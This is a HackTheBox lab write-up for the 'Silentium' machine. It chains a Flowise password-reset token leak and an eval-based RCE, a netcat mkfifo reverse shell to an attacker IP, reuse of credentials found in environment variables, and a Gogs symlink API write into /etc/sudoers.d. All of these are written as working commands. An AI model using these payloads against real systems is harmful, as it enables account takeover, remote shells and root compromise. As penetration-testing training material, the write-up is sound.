# Silentium – HackTheBox Writeup

**Target:** Silentium (10.129.245.103)
**Attacker:** Kali Linux
**OS:** Linux (Ubuntu)
**Difficulty:** Easy
**Attack Path:** Flowise Password Reset Token Leak → RCE via CustomMCP → Docker Container Escape → Gogs Symlink API Exploit → Root

---

## Recon

### Port Scan

```bash
nmap -sV -p- --min-rate 5000 10.129.245.103
```

Standard stuff. SSH on 22 and nginx on 80. The website at `silentium.htb` is some kind of financial services page. Added it to /etc/hosts and started poking around.

### Subdomain Discovery

The main site didn't have much going on so I went looking for subdomains:

```bash
ffuf -u http://10.129.245.103 -H "Host: FUZZ.silentium.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 154
```

Found `staging.silentium.htb`. Added it to hosts and hit it in the browser. It's running Flowise 3.0.5, which is an AI agent builder platform. Has a login page at `/signin`.

### Finding a Valid User

The login endpoint gives different errors for existing vs nonexistent users. Classic user enumeration. Tested a bunch of email addresses:

```bash
for user in marcus.thorne mthorne marcus ben elena.rossi erossi elena admin; do
  echo -n "$user@silentium.htb => "
  curl -s http://staging.silentium.htb/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$user@silentium.htb\",\"password\":\"wrong\"}"
  echo ""
done
```

`ben@silentium.htb` returned `"Incorrect Email or Password"` (401) while everything else returned `"User Not Found"` (404). So ben is a valid user. Now I need his password.

---

## Breaking Into Flowise

### Password Reset Token Leak (CVE-2025-58434)

I was about to bruteforce with rockyou when I found CVE-2025-58434. Flowise versions before 3.0.6 leak the password reset token directly in the server response when you request a reset. That's wild. The token is supposed to go to the user's email, not get returned in the API response.

The tricky part was figuring out the right endpoint and request format. The JS bundle had two separate files for the forgot password flow:

```bash
curl -s http://staging.silentium.htb/assets/forgotPassword-Dt6O5dqm.js
curl -s http://staging.silentium.htb/assets/resetPassword-cNBhmed-.js
```

Reading the minified JavaScript showed the request body needs a `user` wrapper object: `{"user":{"email":"..."}}` not just `{"email":"..."}`. Also the endpoint is `/api/v1/account/forgot-password` not `/api/v1/auth/forgot-password`. That distinction cost me a lot of time. The `auth` endpoints require a JWT token already, the `account` endpoints are the ones that work with the `x-request-from: internal` header bypass.

```bash
curl -s http://staging.silentium.htb/api/v1/account/forgot-password \
  -X POST \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

The entire user object came back including the `tempToken` field and even the hashed password. Completely insane information disclosure.

### Resetting the Password

Used the leaked token to set a new password:

```bash
curl -s http://staging.silentium.htb/api/v1/account/reset-password \
  -X POST \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"THE_LEAKED_TOKEN","password":"Hacker123!"}}'
```

Response came back with `tempToken` cleared to empty string. Password changed. Logged in through the regular auth endpoint:

```bash
curl -sv http://staging.silentium.htb/api/v1/auth/login \
  -X POST \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"email":"ben@silentium.htb","password":"Hacker123!"}' \
  -c cookies.txt
```

Got three cookies back: `token` (JWT), `refreshToken`, and `connect.sid`. All three are needed for authenticated API calls.

---

## Getting a Shell

### Remote Code Execution (CVE-2025-59528)

Flowise before 3.0.5 has an RCE in the CustomMCP endpoint. The `mcpServerConfig` parameter gets passed to a JavaScript eval without any sanitization. You can inject Node.js code that spawns a child process.

First verified code execution with a simple callback:

```bash
# Started python3 -m http.server 8080 on Kali

curl -s http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -X POST \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -b cookies.txt \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"curl http://10.10.14.106:8080/rce_test\");return 1;})()})"}}'
```

Got a hit on the HTTP server. RCE confirmed.

### Reverse Shell

The classic bash reverse shell didn't work. Flowise runs in an Alpine Docker container which doesn't have bash or proper `/dev/tcp` support. The mkfifo method with netcat worked:

```bash
# Listener
nc -lvnp 4444

# Payload
curl -s http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -X POST \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -b cookies.txt \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.106 4444 >/tmp/f\");return 1;})()})"}}'
```

Shell popped as root. But it's root inside a Docker container, not on the host. The hostname was a random hash and `/.dockerenv` existed. Classic container indicators.

---

## Escaping the Container

### Environment Variable Goldmine

Dumped the environment variables immediately because Docker containers love to store credentials in env vars:

```bash
env
```

Jackpot. Found two passwords sitting right there:

```
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
```

No Docker socket mounted, no obvious breakout path from inside the container. But password reuse is always worth trying.

### SSH to the Host

```bash
ssh ben@silentium.htb
# Password: r04D!!_R4ge
```

The SMTP password worked for SSH. We're on the host as `ben`.

```bash
cat /home/ben/user.txt
```

User flag grabbed.

---

## Privilege Escalation

### Initial Enumeration

```bash
sudo -l
# Sorry, user ben may not run sudo on silentium.
id
# uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
```

No sudo, not in any interesting groups. Checked for SUID binaries, cron jobs, capabilities. Nothing obvious. The kernel was 6.8.0-107-generic from March 2026 which is pretty recent.

Tried CopyFail (CVE-2026-31431) but the `algif_aead` module was blocked in modprobe. Patched. Moving on.

### Discovering Gogs

Found Docker running on the host and an interesting service on port 3001:

```bash
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 Jun 15 11:54 /var/run/docker.sock

ss -tlnp
# 127.0.0.1:3001 listening
```

Docker socket exists but ben isn't in the docker group and `newgrp docker` didn't work either. But port 3001 turned out to be Gogs, a self hosted Git service. Found its config at:

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

Three things jumped out immediately:

```ini
RUN_USER   = root
DISABLE_REGISTRATION = false
ROOT_PATH  = /root/gogs-repositories
```

Gogs is running as root. Registration is open. And repositories live in root's home directory. That's the escalation path right there.

### Setting Up Access

Set up an SSH tunnel from Kali to access Gogs through the browser:

```bash
ssh -L 3001:127.0.0.1:3001 ben@silentium.htb
```

Opened `http://127.0.0.1:3001` in Firefox. Registered a new account (had to solve a captcha). Created a repository called `test` and generated an API token under User Settings → Applications.

### Gogs Symlink Exploit (CVE-2025-8110)

This is the one. Gogs versions up to 0.13.3 have a symlink bypass in the PutContents API. The web editor correctly blocks editing symlinks, but the API doesn't check. Since Gogs runs as root, writing through a symlink means writing as root to wherever the symlink points.

Added an SSH key to Gogs and cloned the repo on the host:

```bash
ssh-keygen -t ed25519 -f /tmp/gogs_key -N ""
# Added the public key to Gogs via the browser

cd /tmp
GIT_SSH_COMMAND="ssh -i /tmp/gogs_key" git clone ssh://root@127.0.0.1/inno/test.git
cd test
```

Created a symlink pointing to `/etc/sudoers.d/ben`:

```bash
ln -s /etc/sudoers.d/ben malicious_link
git add malicious_link
git commit -m "symlink"
GIT_SSH_COMMAND="ssh -i /tmp/gogs_key" git push
```

The symlink is now in the repository. The web editor won't let you edit it, but the API will. Created the sudoers payload:

```bash
echo -n "ben ALL=(ALL) NOPASSWD: ALL\n" | base64
# YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg==
```

Hit the PutContents API with the base64 encoded payload:

```bash
curl -X PUT http://127.0.0.1:3001/api/v1/repos/inno/test/contents/malicious_link \
  -H "Authorization: token YOUR_API_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "message": "exploit",
    "content": "YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg=="
  }'
```

The API followed the symlink and wrote `ben ALL=(ALL) NOPASSWD: ALL` directly into `/etc/sudoers.d/ben`. Because Gogs runs as root, it has permission to write there.

### Root

```bash
sudo id
# uid=0(root) ...
sudo cat /root/root.txt
```

Box pwned.

---

## Attack Chain Summary

```
nmap → staging.silentium.htb discovered
→ Flowise 3.0.5 identified
→ User enumeration → ben@silentium.htb exists
→ CVE-2025-58434 (Password Reset Token Leak) → reset ben's password
→ Login → JWT cookies
→ CVE-2025-59528 (RCE via customMCP) → shell in Docker container
→ env vars → SMTP_PASSWORD=r04D!!_R4ge
→ SSH as ben → user flag
→ Gogs on port 3001, running as root, registration open
→ CVE-2025-8110 (Symlink Bypass in PutContents API)
→ Symlink to /etc/sudoers.d/ben → wrote NOPASSWD rule
→ sudo → root
```

---

## What I Learned

The difference between `/api/v1/auth/` and `/api/v1/account/` endpoints matters. I spent way too long hitting the wrong endpoint for the password reset. Always read the JavaScript bundle to understand the actual frontend routes. The minified code had the exact request format and endpoint paths.

The `x-request-from: internal` header is a pattern in Flowise that bypasses certain authentication checks. When you see error messages change from "Unauthorized Access" to "Invalid or Missing token" based on a header, that tells you something got through. Pay attention to how error messages change.

Docker containers almost always have secrets in environment variables. The moment you get a shell in a container, run `env` before anything else. Both the Flowise password and the SMTP password were sitting right there, and the SMTP password was reused for SSH on the host.

Not all reverse shell payloads work everywhere. The bash `/dev/tcp` trick failed in Alpine because Alpine uses ash, not bash. The mkfifo method with netcat is more portable and works on minimal containers.

When a kernel exploit is patched (like CopyFail's `algif_aead` module being blocked), don't get stuck on it. Move on and enumerate more. The Gogs service running as root was a much cleaner escalation path anyway.

Gogs running as root is an instant win if you can create an account. The symlink exploit (CVE-2025-8110) lets you write to any file on the system through the API. The web editor checks for symlinks but the API doesn't. Writing to `/etc/sudoers.d/` is cleaner than trying to overwrite SSH keys because you don't need to worry about file format or permissions.

API tokens work when basic auth doesn't. Gogs returned 401 on every basic auth attempt but an API token generated through the web interface worked perfectly. Always try token based auth if password auth fails on APIs.

SSH tunnels are essential for accessing internal services. Without `ssh -L 3001:127.0.0.1:3001` I couldn't have accessed the Gogs web interface to register, create repos, or generate API tokens. Any time you find an internal service during enumeration, tunnel it out.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
